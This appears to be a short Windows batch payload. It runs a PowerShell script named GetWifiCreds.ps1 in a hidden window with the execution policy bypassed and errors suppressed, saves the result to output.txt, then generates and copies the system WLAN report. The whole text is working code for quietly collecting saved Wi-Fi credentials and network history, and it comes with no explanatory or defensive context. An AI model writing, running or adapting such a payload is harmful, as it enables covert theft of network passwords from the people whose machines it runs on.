powershell -WindowStyle Hidden -executionpolicy bypass -File .\GetWifiCreds.ps1 -ErrorAction SilentlyContinue > output.txt
call netsh wlan show wlanreport
type C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html > wlan-report-latest.html